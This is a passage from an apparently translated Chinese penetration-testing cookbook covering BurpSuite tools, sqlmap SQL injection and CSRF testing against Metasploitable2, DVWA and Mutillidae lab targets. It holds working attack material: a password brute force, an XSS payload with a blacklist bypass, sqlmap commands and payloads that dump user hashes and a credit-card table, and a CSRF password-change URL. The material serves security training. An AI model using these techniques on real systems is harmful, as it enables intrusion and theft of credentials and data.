此外，你的 Web 浏览器需要配置来通过 BurpSuite 本地实例代理 Web 流量。关于将 BurpSuite 用作浏览器代理的更多信息，请参考第一章的“配置 BurpSuite”一节。

### 操作步骤

通常，BurpSuite 会被动扫描所有范围内的 Web 内容，它们通过浏览器在连接代理时范围。术语“被动扫描”用于指代 BurpSuite 被动观察来自或发往服务器的请求和响应，并检测内容中的任何漏洞标识。被动扫描不涉及任何注入或探针，或者其他确认可疑漏洞的尝试。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-8-1.jpg)

主动扫描可以通过右键点击任何站点地图中的对象，或者任何 HTTP 代理历史中的请求，并且选择`Actively scan this branch`，或者` Do an  active scan`，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-8-2.jpg)

所有主动扫描的结果可以通过选择`Scanner`下方的`Scan queue`标签页来复查。通过双击任何特定的扫描项目，你可以复查特定的发现，因为它们属于该扫描，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-8-3.jpg)

主动扫描可以通过选择`Options `标签页来配置。这里，你可以定义要执行的扫描类型，扫描速度，以及扫描的彻底性。

### 工作原理

BurpSuite 的被动扫描器的工作原理是仅仅评估经过它的流量，这些流量在浏览器和任何远程服务器之间通信。这在识别一些非常明显的漏洞时非常有用，但是不足以验证许多存在于服务器中的更加严重的漏洞。主动扫描器的原理是发送一系列探针给请求中识别的参数。这些探针可以用于识别许多常见的 Web 应用漏洞，例如目录遍历、XSS 和 SQL 注入。

## 7.9 使用 BurpSuite Intruder（干扰器）

BurpSuite 中的另一个非常有用的工具就是 Intruder。这个工具通过提交大量请求来执行快节奏的攻击，同时操作请求中预定义的载荷位置。我们会使用 BurpSuite Intruder 来讨论如何自动化请求内容的操作。

### 准备

为了使用 BurpSuite 对目标执行 Web 应用分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

此外，你的 Web 浏览器需要配置来通过 BurpSuite 本地实例代理 Web 流量。关于将 BurpSuite 用作浏览器代理的更多信息，请参考第一章的“配置 BurpSuite”一节。

### 操作步骤

为了使用 BurpSuite Intruder，需要通过拦截捕获或者代理历史向其发送请求。完成之后，右击请求并选择`Send to Intruder`，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-9-1.jpg)

在下面的例子中，DVWA` Brute Force`应用的登录入口中输入了用户名和密码。在发往 Intruder 之后，可以使用`Positions`标签页来设置载荷。为了尝试爆破管理员密码，需要设置的载荷位置只有`password`参数，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-9-2.jpg)

一旦载荷位置定义好了，被注入的载荷可以在`Payloads`标签页中配置。为了执行字典攻击，我们可以使用自定义或内建的字典列表。这个例子中，内建的`Passwords`列表用于这次攻击，像这样：、

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-9-3.jpg)

一旦配置好了攻击，你可以点击屏幕顶端的`Intruder`菜单，之后点击`start attack`。这会通过将每个值插入到载荷位置，快速提交一系列请求。为了判断是否存在任何请求生成了完全不同的响应，我们可以将结果按照长度排序。这可以通过点击`Length`表头来完成，通过点击将长度降序排列，我们可以识别出某个长度其它响应的响应。这就是和长度密码相关（碰巧为`password`）的响应。成功的登录尝试会在下一个秘籍中进一步确认，那些我们会讨论 Comparer 的用法。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-9-4.jpg)

### 工作原理

BurpSuite Intruder 的原理是自动化载荷操作。它允许用户指定请求中的一个或多个载荷位置，之后提供大量选项，用于配置这些值如何插入到载荷位置。它们会每次迭代后修改。

## 7.10 使用 BurpSuite Comparer（比较器）

在执行 Web 应用评估是，能够轻易识别 HTTP 请求或者响应中的变化非常重要。Comparer 功能通过提供图形化的变化概览，简化了这一过程。这个秘籍中，我们会谈论如何使用 BurpSuite 识别和评估多种服务器响应。

### 准备

为了使用 BurpSuite 对目标执行 Web 应用分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

此外，你的 Web 浏览器需要配置来通过 BurpSuite 本地实例代理 Web 流量。关于将 BurpSuite 用作浏览器代理的更多信息，请参考第一章的“配置 BurpSuite”一节。

### 操作步骤

任何包含不一致内容的异常通常都值得调查。响应中的变化通常是载荷产生了所需结果的明显标志。在前面使用 BurpSuite Intruder 来爆破 DVWA 登录的演示中，某个特定的载荷生成了比其它更长的响应。为了评估响应的变化，右击事件并点击`Send to Comparer (response)`。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-10-1.jpg)

将事件发送给 Comparer 之后，你可以选择屏幕上访的`Comparer`标签页来评估它们。确保之前的响应之一选择为`item 1`，另外的一个响应选择为`item 2`，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-10-2.jpg)

在屏幕下方，存在`compare words `和`compare words `的选项。这里我们选择`compare words `。我们可以看到，响应中一些内容的变化反映了登录成功。任何修改、删除或添加的内容都会在响应当中高亮显式，使其更加易于比较，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-10-3.jpg)

### 工作原理

BurpSuite Comparer 的原理是分析任意两个内容来源，并找出不同。这些不同被识别为修改、删除或添加的内容。快速区分内容中的变化可以用于高效判断特定操作的不同效果。

## 7.11 使用 BurpSuite Repeater（重放器）

在执行 Web 应用评估过程中，很多情况下需求手动测试来利用指定的漏洞。捕获代理中的每个响应、操作并转发非常消耗时间。BurpSuite 的 Repeater 功能通过一致化的操作和提交单个请用，简化了这个过程，并不需要在浏览器中每次重新生成流量。这个秘籍中，我们会讨论如何使用 BurpSuite 执行手动的基于本文的审计。

### 准备

为了使用 BurpSuite 对目标执行 Web 应用分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

此外，你的 Web 浏览器需要配置来通过 BurpSuite 本地实例代理 Web 流量。关于将 BurpSuite 用作浏览器代理的更多信息，请参考第一章的“配置 BurpSuite”一节。

### 操作步骤

为了使用 BurpSuite Repeater，请求需要通过拦截捕获或者代理历史来发送给它。发送之后，右击请求之后选择`Send to Repeater`，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-11-1.jpg)

在这个例子中，用户生成的请求用于提供名称，服务器以 HTML 响应返回所提供的输入。为了测试跨站脚本的可能性，我们应该在这种攻击中首先注入一系列常见的字符，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-11-2.jpg)

在发送一系列字符之后，我们可以看到，所有字符都在 HTML 内容中返回，没有字符被转义。这很大程度上表示，这个功能存在跨站脚本漏洞。为了测试漏洞是否可以利用，我们可以输入标准的标识请求`<script>alert('xss')</ script>`，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-11-3.jpg)

通过查看返回的 HTML 内容，我们可以看到，开头的`script`标签已经从响应中移除了。这可能表明黑名单禁止在输入中使用`script`标签。黑名单的问题就是，它可以通过修改输入来绕过。这里，我们可以尝试通过修改标签中几个字符的大小写来绕过黑名单，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-11-4.jpg)

通过使用`<ScRiPt>`标签，我们可以看到，强加的限制已经绕过了，开始和闭合标签都包含在响应中。这可以通过在浏览器中输入请求来验证，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-11-5.jpg)

为了评估客户端浏览器中的响应，右击请求之后选择`Request in browser`。这会生成一个 URL，它可以用于重新在已连接到 Burp 代理的浏览器中提交请求。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-11-6.jpg)

我们可以手动复制提供的 URL，或者点击`Copy`按钮。这个 URL 之后可以粘贴到浏览器中，而且请求会在浏览器中提交。假设跨站脚本攻击是成功的，客户端 JS 代码会在浏览器中渲染，并且屏幕上会出现提示框，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-11-7.jpg)

### 工作原理

BurpSuite Repeater 仅仅通过向 Web 提供文本界面来工作。Repeater 可以让用户通过直接操作请求和远程 Web 服务交互，而不是和 Web 浏览器交互。这在测试真实 HTML 输出比渲染在浏览器中的方式更加重要时非常有用。

## 7.12 使用 BurpSuite Decoder（解码器）

在处理 Web 应用流量时，你会经常看到出于混淆或功能性而编码的内容。BurpSuite Decoder 可以解码请求或响应中的内容，或按需编码内容。这个秘籍中，我们会讨论如何使用 BurpSuite 编码和解码内容。

### 准备

为了使用 BurpSuite 对目标执行 Web 应用分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

此外，你的 Web 浏览器需要配置来通过 BurpSuite 本地实例代理 Web 流量。关于将 BurpSuite 用作浏览器代理的更多信息，请参考第一章的“配置 BurpSuite”一节。

### 操作步骤

为了向 BurpSuite Decoder 传递指定的值，高亮所需的字符串，右击它，并选择` Send to Decoder`。在下面的例子中，`Cookie`参数的值被发送到了解码器，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-12-1.jpg)

通过点击`Smart decode`按钮，BurpSuite 会自动将编码识别为 URL 编码，并将其解码到编码文本下面的区域中，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-12-2.jpg)

如果 BurpSuite 不能判断编码类型，可以以多种不同编码类型来手动解码，包括 URL、HTML、Base64、ASCII Hex，以及其它。解码器也能够使用`Encode as...`功能来编码输入的字符串。

### 工作原理

BurpSuite Decoder 在和 Web 应用交互时提供了编码和解码的平台。这个工具十分有用，因为 Web 上由多种编码类型经常用于处理和混淆目的。此外，`Smart decode`工具检测任何所提供输入的已知模式或签名，来判断内容所使用的编码类型，并对其解码。

## 7.13 使用 BurpSuite Sequencer（序列器）

Web 应用会话通常由会话 ID 标识来维护，它由随机或伪随机值组成。出于这个原因，随机性通常是这些应用的安全的关键。这个秘籍中，我们会讨论如何使用 BurpSuite Sequencer 来收集生成的值，并测试它们的随机性。

### 准备

为了使用 BurpSuite 对目标执行 Web 应用分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

此外，你的 Web 浏览器需要配置来通过 BurpSuite 本地实例代理 Web 流量。关于将 BurpSuite 用作浏览器代理的更多信息，请参考第一章的“配置 BurpSuite”一节。

### 操作步骤

为了使用 BurpSuite Sequencer，响应必须包含`Set-Cookie`协议头，或者其它伪随机数的值，测试需要它们来发送。这可以通过 HTTP 代理历史或者先于浏览器的响应拦截来完成，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-13-1.jpg)

Burp 会自动使用响应中的所有 Cookie 值填充 Cookie 下拉菜单。作为替代，你可以使用`Custom location `字段，之后点击`Configure `按钮来指定响应中的任何位置用于测试，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-13-2.jpg)

在确定需要测试的值之后，点击`Start live capture`按钮，这会开始提交大量请求来获得参数的附加值。这个例子中，Burp 会提交大量请求，并将 PHPSESSID 从请求中去除。这会导致服务器为每个请求生成新的会话标识。这样一来，我们就可以获得样本值，它们可以用于完成 FIPS  测试。FIPS 测试由一系列测试组成，它们会评估所生成的伪随机数的熵。所有这些测试会以图形格式展示，使其十分易懂，像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/7-13-3.jpg)

对于高准确率和彻底的 FIPS 测试来说，总共需要 20000 个值。但是分析最少可以以 100 个值来执行。除了执行实时捕获之外，`Manual load `标签页可以用于为测试上传或粘贴值的列表。

### 工作原理

BurpSuite Sequencer 对伪随机数样本执行大量不同的数学评估，根据所生成随机数的熵尝试判断其质量。实时捕获可用于生成样本值，它通过提交事先构造的请求，并导致服务器指派新的值。这通常通过从请求中移除现有`Cookie`值，从而使响应以新的`Set-Cookie`协议头的形式，提供新的会话标识来完成。

## 7.14 使用 sqlmap 注入 GET 方法

Web 应用常常接受所提供 URL 内的参数。这些参数通常以 HTTP GET 方法传给服务器。如果任何这些参数随后包含在发给后端数据库的查询语句中，SQL 注入漏洞就可能存在。我们会讨论如何使用 sqlmap 来自动化 HTTP GET 方法请求参数的测试。

### 准备

为了使用 sqlmap 对目标执行 Web 应用分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

### 操作步骤

为了使用 sqlmap 来测试 HTTP GET 方法参数，你需要使用`-u`参数以及要测试的 URL。这个 URL 应该包含任何 GET 方法参数。此外，如果 Web 内容仅仅通过建立的会话来方法，还需要使用`--cookie`提供与会话对应的 Cookie。

```
root@KaliLinux:~# sqlmap -u "http://172.16.36.135/dvwa/vulnerabilities/ sqli/?id=x&Submit=y" --cookie="security=low; PHPSESSID=bcd9bf2b6171b16f94 3cd20c1651bf8f" --risk=3 --level=5 
                                ** {CUT} ** 
sqlmap identified the following injection points with a total of 279 HTTP(s) requests: 
--
Place: GET 
Parameter: id
    Type: boolean-based blind    
    Title: OR boolean-based blind - WHERE or HAVING clause    
    Payload: id=-2345' OR (1644=1644) AND 'moHu'='moHu&Submit=y
    
    Type: error-based    
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    
    Payload: id=x' AND (SELECT 1537 FROM(SELECT COUNT(*),CONCAT(0x3a6b6f 683a,(SELECT (CASE WHEN (1537=1537) THEN 1 ELSE 0 END)),0x3a696a793a,FLO OR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'VHVT'='VHVT&Submit=y
    
    Type: UNION query    
    Title: MySQL UNION query (NULL) - 2 columns    
    Payload: id=x' UNION ALL SELECT CONCAT(0x3a6b6f683a,0x7979634f4e716b7 55961,0x3a696a793a),NULL#&Submit=y
    
    Type: AND/OR time-based blind    
    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    
    Payload: id=x' AND 5276=BENCHMARK(5000000,MD5(0x704b5772)) AND 'XiQP'='XiQP&Submit=y 
--

                            ** {TRUNCATED} ** 
```

上面的例子使用了`risk`值`3`和`level`值`5`。这些值定义了所执行测试的风险性和彻底性。更多`risk`和`level`的信息请参考 sqlmap 手册页和帮助文件。执行测试时，sqlmap 会快速将后端数据库识别为 MySQL，并跳过其它测试。如果没有指定任何操作，sqlmap 会仅仅判断是否任何参数存在漏洞，像上个例子那样。在一系列注入尝试之后，sqlmap 判断出`ID`参数存在多种类型的 SQL 注入漏洞。在确认漏洞之后，sqlmap 会执行操作来提取后端数据库的信息。

```
root@KaliLinux:~# sqlmap -u "http://172.16.36.135/dvwa/vulnerabilities/ sqli/?id=x&Submit=y" --cookie="security=low; PHPSESSID=bcd9bf2b6171b16f94 3cd20c1651bf8f" --risk=3 --level=5 --dbs 
                            ** {CUT} ** 

--
[03:38:00] [INFO] the back-end DBMS is MySQL 
web server operating system: Linux Ubuntu 8.04 (Hardy Heron) 
web application technology: PHP 5.2.4, Apache 2.2.8 
back-end DBMS: MySQL 5.0 
[03:38:00] [INFO] fetching database names 
[03:38:00] [WARNING] reflective value(s) found and filtering out 
available databases [7]: 
[*] dvwa
[*] information_schema 
[*] metasploit 
[*] mysql 
[*] owasp10 
[*] tikiwiki 
[*] tikiwiki195
                            ** {TRUNCATED} ** 
```

在上面的例子中，`--dbs`参数用于枚举所有可用的，能通过 SQL 注入访问的数据库。通过名称来判断，它表明列出的数据库直接对应 DVWA 的应用。我们之后可以直接对数据库执行操作。为了提取 DWVA 数据库的所有表的名称，我们可以使用`--tables`参数来让 sqlmap 提取表名称，之后使用`-D`参数指定需要提取的数据库（`dvwa`）。

```
root@KaliLinux:~# sqlmap -u "http://172.16.36.135/dvwa/vulnerabilities/ sqli/?id=x&Submit=y" --cookie="security=low; PHPSESSID=bcd9bf2b6171b16f94 3cd20c1651bf8f" --risk=3 --level=5 --tables -D dvwa 
                            ** {CUT} ** 
Database: dvwa 
[2 tables] 
+-----------+ 
| guestbook | 
| users     | 
+-----------+ 
                            ** {TRUNCATED} ** 
```

这样做，我们可以看到 DVWA 数据库中有两个表。这些表包括`guestbook`和`users`。用户表通常值得提取，因为它通常包含用户名和相关的密码哈希。为了从某个指定表中提取信息，我们可以使用`--dump`参数，之后使用`-D`参数来指定数据库，`-T`参数来指定提取哪个表的内容。

```
root@KaliLinux:~# sqlmap -u "http://172.16.36.135/dvwa/vulnerabilities/ sqli/?id=x&Submit=y" --cookie="security=low; PHPSESSID=bcd9bf2b6171b16f94 3cd20c1651bf8f" --risk=3 --level=5 --dump -D dvwa -T users 
                            ** {CUT} ** 
do you want to crack them via a dictionary-based attack? [Y/n/q] Y 
[03:44:03] [INFO] using hash method 'md5_generic_passwd' 
what dictionary do you want to use?
[1] default dictionary file './txt/wordlist.zip' (press Enter) 
[2] custom dictionary file 
[3] file with list of dictionary files 
> 
[03:44:08] [INFO] using default dictionary 
do you want to use common password suffixes? (slow!) [y/N] N 
                                ** {CUT} ** 
Database: dvwa 
Table: users 
[5 entries] 
+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+-----------+ 
| user_id | user    | avatar                                                 | password                                    | last_name | first_name | 
+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+-----------+ 
| 1       | admin   | http://192.168.223.132/dvwa/hackable/users/admin. jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 
| 2       | gordonb | http://192.168.223.132/dvwa/hackable/users/gordonb. jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 
| 3       | 1337    | http://192.168.223.132/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 
| 4       | pablo   | http://192.168.223.132/dvwa/hackable/users/pablo. jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 
| 5       | smithy  | http://192.168.223.132/dvwa/hackable/users/smithy. jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 
+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+-----------+ 
                                ** {TRUNCATED} **
```

在识别表的内容中存在密码哈希之后，sqlmap 会提供选项，询问用户是否使用内置的密码破解器来对枚举密码哈希执行字典攻击。这可以使用内置单词列表，自定义单词列表，或者一系列单词列表来执行。在执行字典攻击之后，我们可以看到表的内容包含用户 ID，用户头像的位置，MD5 哈希，哈希的纯文本附加值（盐），以及用户姓名。

### 工作原理

sqlmap 的原理是提交来自大量已知 SQL 注入查询列表的请求。它在近几年间已经高度优化，并给予之前查询的响应来智能调整注入。在 HTTP GET 参数上执行 SQL 注入非常繁琐，因为修改内容要经过请求 URL 。

## 7.15 使用 sqlmap 注入 POST 方法

sqlmap 是 Kali 中的集成命令行工具，它通过自动化整个流程，极大降低了手动利用 SQL 注入漏洞所需的经历总量。这个秘籍中，我们会讨论如何使用 sqlmap 来自动化 HTTP POST 请求参数的测试。

### 准备

为了使用 sqlmap 对目标执行 Web 应用分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

为了在使用 HTTP POST 方法的服务上指定 SQL 注入，我们需要使用`--data`参数来指定 POST 参数字符串。Mutillidae 的登录应用提供了一个登录页面，它通过 POST 方法传递用户名和密码。它就是我们的 SQL 注入攻击目标。看看下面的例子：

```
root@KaliLinux:~# sqlmap -u "http://172.16.36.135/mutillidae/index. php?page=login.php" --data="username=user&password=pass&login-php-submitbutton=Login" --level=5 --risk=3 
                        ** {CUT} ** 
sqlmap identified the following injection points with a total of 267 HTTP(s) requests:
--
Place: POST 
Parameter: username    
    Type: boolean-based blind    
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    
    Payload: username=-8082' OR (4556=4556)#&password=pass&login-phpsubmit-button=Login
    
    Type: error-based    
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    
    Payload: username=user' AND (SELECT 3261 FROM(SELECT COUNT(*),CONCAT( 0x3a61746d3a,(SELECT (CASE WHEN (3261=3261) THEN 1 ELSE 0 END)),0x3a76676 23a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x) a) AND 'MraR'='MraR&password=pass&login-php-submit-button=Login 
--
[04:14:10] [INFO] the back-end DBMS is MySQL 
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8 
back-end DBMS: MySQL 5.0 
                        ** {TRUNCATED} ** 
```

如果没有指定操作，sqlmap 仅仅会判断是否任何参数存在漏洞，像上面的例子那样。在一系列注入尝试之后，sqlmap 判断出用户名 POST 参数存在`boolean-blind`和`error-based`漏洞。在确认漏洞之后，sqlmap 会执行操作，开始从后端数据库提取信息。

```
root@KaliLinux:~# sqlmap -u "http://172.16.36.135/mutillidae/index. php?page=login.php" --data="username=user&password=pass&login-php-submitbutton=Login" --dbs 
                        ** {CUT} ** 
available databases [7]: 
[*] dvwa 
[*] information_schema 
[*] metasploit 
[*] mysql 
[*] owasp10 
[*] tikiwiki 
[*] tikiwiki195 
                        ** {TRUNCATED} **
```

在上面的例子中，`--dbs`参数用于枚举所有可用的，可通过 SQL 注入访问的数据库。我们随后可以对特定数据库直接执行操作。为了提取`owasp10`数据库中的所有表的名称，我们可以使用`--tables`参数让 sqlmap 提取表名称。之后使用`-D`参数来指定从哪个数据库（`owasp10`）提取名称。

```
root@KaliLinux:~# sqlmap -u "http://172.16.36.135/mutillidae/index. php?page=login.php" --data="username=user&password=pass&login-php-submitbutton=Login" --tables -D owasp10 
                    ** {CUT} ** 
Database: owasp10 
[6 tables] 
+----------------+ 
| accounts       | 
| blogs_table    | 
| captured_data  | 
| credit_cards   | 
| hitlog         | 
| pen_test_tools | 
+----------------+ 
                    ** {TRUNCATED} ** 
```

这样做，我们就可以看到，`owasp10`数据库中存在六个表。这些表包含`accounts, blog_table, captured_data, credit_cards, hitlog, and pen_test_tools`。最明显的表名称是`credit_cards`。为了提取某个指定表的内容，我们可以使用`--dump`参数，之后使用`-D`参数来指定数据库，`-T`参数来指定从哪个表中提取内容。

```
root@KaliLinux:~# sqlmap -u "http://172.16.36.135/mutillidae/index. php?page=login.php" --data="username=user&password=pass&login-php-submitbutton=Login" --dump -D owasp10 -T credit_cards 
                    ** {CUT} ** 
Database: owasp10 
Table: credit_cards 
[5 entries] 
+------+-----+------------------+------------+ 
| ccid | ccv | ccnumber         | expiration | +------+-----+------------------+------------+ 
| 1    | 745 | 4444111122223333 | 2012-03-01 |
| 2    | 722 | 7746536337776330 | 2015-04-01 | 
| 3    | 461 | 8242325748474749 | 2016-03-01 | 
| 4    | 230 | 7725653200487633 | 2017-06-01 | 
| 5    | 627 | 1234567812345678 | 2018-11-01 | +------+-----+------------------+------------+ 
                    ** {TRUNCATED} **
```

### 工作原理

sqlmap 的原理是提交来自大量已知 SQL 注入查询列表的请求。它在近几年间已经高度优化，并给予之前查询的响应来智能调整注入。在 HTTP POST 参数上执行 SQL 注入的原理是操作添加到 POST 方法请求末尾的数据。

## 7.16 使用 sqlmap 注入捕获的请求

为了简化 sqlmap 的使用流程，可以使用来自 BurpSuite 的捕获请求并使用定义在其中的所有参数和配置来执行 sqlmap。在这个秘籍中，我们会讨论如何使用 sqlmap 来测试和所捕获请求相关的参数。

### 准备

为了使用 sqlmap 对目标执行 Web 应用分析，你需要拥有运行一个或多个 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

### 操作步骤

为了在 sqlmap 中使用捕获的请求，必须首先将其保存为文本格式。为了这样做，右击 BurpSuite 中的请求内容之后选择`Copy to file`。保存之后，你就可以通过浏览器目录并使用`cat`命令来验证文件内容。

```
root@KaliLinux:~# cat dvwa_capture 
GET /dvwa/vulnerabilities/sqli_blind/?id=test_here&Submit=Submit HTTP/1.1
Host: 172.16.36.135 
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Referer: http://172.16.36.135/dvwa/vulnerabilities/sqli_blind/ 
Cookie: security=low; PHPSESSID=8aa4a24cd6087911eca39c1cb95a7b0c 
Connection: keep-alive 
```

为了使用捕获的请求，以 `-r`参数执行 sqlmap，值为文件的绝对路径。这个方式通常会极大降低在`sqlmap`命令中需要提供的信息量，因为需要提供的多数信息都包含在文件里了。看看下面的例子：

```
oot@KaliLinux:~# sqlmap -r /root/dvwa_capture --level=5 --risk=3 -p id
[*] starting at 16:44:09
[16:44:09] [INFO] parsing HTTP request from '/root/dvwa_capture' 
```

在上面的例子中，不需要向 sqlmap 传递任何 Cookie 值，因为 Cookie 值已经定义在捕获的请求中了。当 sqlmap 运行时，捕获文件中的 Cookie 会自动在所有请求中使用，像这样：

```
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N 
sqlmap identified the following injection points with a total of 487 HTTP(s) requests: 
--
Place: GET 
Parameter: id
    Type: boolean-based blind 
    Title: OR boolean-based blind - WHERE or HAVING clause    
    Payload: id=-8210' OR (7740=7740) AND 'ZUCk'='ZUCk&Submit=Submit
    
    Type: UNION query    
    Title: MySQL UNION query (NULL) - 2 columns    
    Payload: id=test_here' UNION ALL SELECT NULL,CONCAT(0x3a6f63723a,0x67 744e67787a6157674e,0x3a756c753a)#&Submit=Submit
    
    Type: AND/OR time-based blind    
    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    
    Payload: id=test_here' AND 4329=BENCHMARK(5000000,MD5(0x486a7a4a)) AND 'ARpD'='ARpD&Submit=Submit 
```

sqlmap 能够测试捕获请求中的所有识别的 GET 方法参数。这里，我们可以看到，`ID`参数存在多个 SQL 注入漏洞。

### 工作原理

sqlmap 能够接受捕获的请求，来解析请求的内容并是被任何可测试的参数。这让 sqlmap 能够高效执行，而不需要花费额外的经历来传递攻击所需的所有参数。

## 7.17 自动化 CSRF 测试

跨站请求伪造（CSRF）是最难以理解的 Web 应用漏洞之一。无论如何，不能够识别这类漏洞会危害 Web 应用和它的用户。这个秘籍中，我们会讨论如何测试 GET 和 POST 方法中的 CSRF 漏洞。

### 准备

为了对目标执行 CSRF 测试，你需要拥有运行一个或多个含有 CSRF 漏洞的 Web 应用的远程系统。所提供的例子中，我们使用 Metasploitable2 实例来完成任务。 Metasploitable2 拥有多种预安装的漏洞 Web 应用，运行在 TCP 80 端口上。配置 Metasploitable2 的更多信息请参考第一章中的“安装 Metasploitable2”秘籍。

### 操作步骤

CSRF 可能会出现在 GET 或 POST 方法的事务中，DVWA 提供了 GET 方法 CSRF 漏洞的一个良好示例。应用允许用户通过 GET 方法提交新的值两次来更新密码。

```
GET /dvwa/vulnerabilities/csrf/?password_new=password&password_ conf=password&Change=Change HTTP/1.1 
Host: 172.16.36.135 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Referer: http://172.16.36.135/dvwa/vulnerabilities/csrf/ 
Cookie: security=low; PHPSESSID=8aa4a24cd6087911eca39c1cb95a7b0c 
```

由于缺少 CSRF 控制，我们尝试利用这个漏洞。如果 Web 应用的用户被引诱来访问某个 URL，其中含有预先配置的`password_ new `和`password_ conf`值，攻击者就能强迫受害者将密码修改为攻击者的选择。下面的 URL 是个利用的示例。如果受害者访问了这个链接，它们的密码会被修改为`compromised`。

```
http://172.16.36.135/dvwa/vulnerabilities/csrf/?password_ new=compromised&password_conf=compromised&Change=Change#
```

